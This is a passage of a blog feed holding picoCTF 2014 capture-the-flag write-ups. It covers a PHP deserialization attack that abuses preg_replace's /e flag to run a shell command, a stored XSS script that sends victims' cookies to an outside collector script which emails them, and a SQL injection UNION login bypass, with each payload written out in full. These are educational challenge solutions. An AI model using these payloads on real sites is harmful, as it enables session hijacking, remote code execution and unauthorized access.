+<div class="language-PHP language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$filter_set = [</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		new Filter('/.*/e', 'system("cat /home/daedalus/flag.txt")')</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	];</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$obj = serialize(true) . "\n" . serialize(new Post(</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	"the flag is",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	"fail",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	$filter_set));</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>The Filter uses the “e” flag on the <code>preg_replace()</code> call. This will run the replacement argument as PHP code and replace the matching text with the output.</p>
+<p>By having out only filter match everything, and run the command <code>$ cat /home/daedalus/flag.txt</code>, we will replace the body of the Post we inject with the flag.</p>
+<p>Outputting this serialized object to a file, and inputting that file to the hash_extender command discussed above, we can generate the new value of <code>custom_settings_hash</code>. It is important to note, using a file is the best way to go about this part of the problem; before the object is urlencoded, it will have nonprinting characters which you will not be able to copy and paste.</p>
+<p>Finally, by replacing <code>custom_settings</code> with a urlencoding of the serialized object, and <code>custom_settings_hash</code> with the new signature, we will see the flag in the comments of the site:</p>
+<p>D43d4lu5_w45_h3r3_w1th_s3rialization_chief_steve</p>
+<hr>
+<p>Note: the payload for <code>custom_settings</code> will look something like:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">b%253A1%253B%250AO%253A4%253A%2522Post%2522%253A3%253A%257Bs%253A8%253A%2522%2500%252A%2500title%2522%253Bs%253A11%253A%2522the%2Bflag%2Bis%2522%253Bs%253A7%253A%2522%2500%252A%2500text%2522%253Bs%253A4%253A%2522fail%2522%253Bs%253A10%253A%2522%2500%252A%2500filters%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A6%253A%2522Filter%2522%253A2%253A%257Bs%253A10%253A%2522%2500%252A%2500pattern%2522%253Bs%253A5%253A%2522%252F.%252A%252Fe%2522%253Bs%253A7%253A%2522%2500%252A%2500repl%2522%253Bs%253A37%253A%2522system%2528%2522cat%2B%252Fhome%252Fdaedalus%252Fflag.txt%2522%2529%2522%253B%257D%257D%257D</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>However, I do not believe this is perfectly accurate as I recall making changes out of file that were never duplicated in my backup of the payload. Because of this, I have not included the payload or its signature in this writeup.</p>]]></content>
+        <author>
+            <name>Clifford</name>
+            <uri>https://github.com/CSRessel</uri>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[picoCTF 2014 part 2: secure_page_service]]></title>
+        <id>https://clifford.ressel.fyi/blog/picoctf-2014-part2</id>
+        <link href="https://clifford.ressel.fyi/blog/picoctf-2014-part2"/>
+        <updated>2014-11-30T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Summary]]></summary>
+        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#summary" class="hash-link" aria-label="Direct link to Summary" title="Direct link to Summary">​</a></h2>
+<p>This problem is a simple XSS challenge. Using persistent XSS in a newly created page, we can steal the admin’s cookies should they choose to visit the page. The “Report to Moderator” button says, “Report this page, and a moderator will personally review it in the next few minutes!” so it is a safe assumption that we can have an admin view our injected code.</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="recon">Recon<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#recon" class="hash-link" aria-label="Direct link to Recon" title="Direct link to Recon">​</a></h2>
+<p>The first thing we need is an account on the challenge's site. The home page allows anyone to register. After an account is made, two actions are available: create a page, and view a page. Attempting to view the page asked for in the problem shows it is password protected. A couple quick queries show it is not vulnerable to SQL injection; another route is necessary.</p>
+<p>Examining the page creation by creating a couple random pages, we notice that we can report pages to be reviewed by a moderator (“Spam? Abuse? Report this page, and a moderator will personally review it in the next few minutes!”).</p>
+<p>Furthermore, attempting to use HTML tags reveals that the input allows HTML code.</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="enter-xss">Enter XSS<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#enter-xss" class="hash-link" aria-label="Direct link to Enter XSS" title="Direct link to Enter XSS">​</a></h2>
+<p>We can use a persistent XSS attack to steal the cookies of whoever views the page. By injecting a script into the page, we can send the viewer’s cookies elsewhere. By setting up a php script on a free hosting script, we can redirect the sent cookies to our own email. The final step will be to report the page to moderator to cause them to view our injected page.</p>
+<p>Once we have the admin’s cookies, we can change our cookies to theirs to view the locked page.</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-setup">The Setup<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#the-setup" class="hash-link" aria-label="Direct link to The Setup" title="Direct link to The Setup">​</a></h2>
+<p>First we need the two scripts.</p>
+<p>The injected script for the page will be:</p>
+<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;</span><span class="token tag" style="color:rgb(255, 121, 198)">script</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><span class="token script language-javascript dom variable" style="color:rgb(189, 147, 249);font-style:italic">location</span><span class="token script language-javascript punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token script language-javascript property-access">href</span><span class="token script language-javascript"> </span><span class="token script language-javascript operator">=</span><span class="token script language-javascript"> </span><span class="token script language-javascript string" style="color:rgb(255, 121, 198)">'http://www.YourDomainName.com/cookiestealer.php?cookie='</span><span class="token script language-javascript operator">+</span><span class="token script language-javascript dom variable" style="color:rgb(189, 147, 249);font-style:italic">document</span><span class="token script language-javascript punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token script language-javascript property-access">cookie</span><span class="token script language-javascript punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&lt;/</span><span class="token tag" style="color:rgb(255, 121, 198)">script</span><span class="token tag punctuation" style="color:rgb(248, 248, 242)">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>And the php script at the above domain name (cookiestealer.php) will look like:</p>
+<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$cookie = $HTTP_GET_VARS["cookie"]; mail("YourEmail@YouMailProvider.com", "Stolen Cookies", $cookie);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>For free hosting, a number of options are available. We chose to use <a href="http://www.000webhost.com/">000webhost</a>, simply because they have a nice in-browser file manager—no need to mess around with FTP clients.</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="cookie-forgery">Cookie Forgery<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part2#cookie-forgery" class="hash-link" aria-label="Direct link to Cookie Forgery" title="Direct link to Cookie Forgery">​</a></h2>
+<p>After setting up a page with the injected script and the php script on another server, we simply report the page to have a mod (in reality a bot) view the page.</p>
+<p>From here, we check our email for the admin cookies. Using a plugin like <a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en">this</a> or <a href="https://addons.mozilla.org/en-us/firefox/addon/edit-cookies/">this</a> we can quickly change our cookies to the admin's, allowing us to view the locked page, and thus, the flag:</p>
+<p>wow_cross_site_scripting_is_such_web</p>]]></content>
+        <author>
+            <name>Clifford</name>
+            <uri>https://github.com/CSRessel</uri>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[picoCTF 2014 part 1: Injection 2]]></title>
+        <id>https://clifford.ressel.fyi/blog/picoctf-2014-part1</id>
+        <link href="https://clifford.ressel.fyi/blog/picoctf-2014-part1"/>
+        <updated>2014-11-29T00:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Summary]]></summary>
+        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part1#summary" class="hash-link" aria-label="Direct link to Summary" title="Direct link to Summary">​</a></h2>
+<p>By unioning hard coded values with the prewritten select statement, we can manually control exactly what data the query returns, and thus meet the program’s requirements.</p>
+<div class="language-SQL language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'asdf'</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> a</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> c</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> e </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">LIMIT</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">-- '</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>(with “1337” entered as the password)</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-program">The Program<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part1#the-program" class="hash-link" aria-label="Direct link to The Program" title="Direct link to The Program">​</a></h2>
+<p>The source is available <a href="http://web2014.picoctf.com/injection2/login.phps">here</a>. Examination of the source shows several things.
+First, we can make injections into the username field.
+Second, the returned data from the query will need to meet the following requirements to reveal the flag:</p>
+<ul>
+<li><code>mysqli_num_rows($result) === 1</code> — only one row</li>
+<li><code>$row["password"] === $password</code> — row’s password must match our given password</li>
+<li><code>$row["user_level"] &gt;= 1337</code> — row’s user_level must be greater than or equal to 1337</li>
+</ul>
+<p>Finally, by setting the form’s hidden field “debug” to 1, we receive a nice view of our input and the generated query.</p>
+<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-injection">The Injection<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part1#the-injection" class="hash-link" aria-label="Direct link to The Injection" title="Direct link to The Injection">​</a></h2>
+<p>By taking a union with a hardcoded query, we can manually control exactly what the returned data contains, and thus meet all the prespecified requirements.</p>
+<p>An injection of:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">asdf' UNION SELECT 0 AS a LIMIT 1 -- </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>Will yield the query:</p>
+<div class="language-SQL language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'asdf'</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> a </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">LIMIT</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">-- </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>Let’s break that query down: we set the username to be a value unlikely to appear in the database. We then union that SELECT statement with our own, which includes a hard coded value of 0 for the first column. Finally, we return only one of the row with LIMIT 1, to satisfy the aforementioned check for only one row.
+This gives us the following error:</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">SQL error: The used SELECT statements have a different number of columns</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>However, if we add some dummy columns (common sense suggest five columns: username, password, user_level, data created, date last modified), the error disappears.
+New query:</p>
+<div class="language-SQL language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'asdf'</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> a</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> c</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> e </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">LIMIT</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">-- </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>As we do not know which column will be the user_level, we can simply set all columns equal to 1337, and input a password of 1337 into the form.</p>
+<p>The final query:</p>
+<div class="language-SQL language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">'asdf'</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">UNION</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> a</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> c</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token number">1337</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">AS</span><span class="token plain"> e </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">LIMIT</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"> </span><span class="token comment" style="color:rgb(98, 114, 164)">-- '</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>This proves successful!
+(as the flag appears to be dynamically generated it is not included here)</p>]]></content>
         <author>
             <name>Clifford</name>
             <uri>https://github.com/CSRessel</uri>
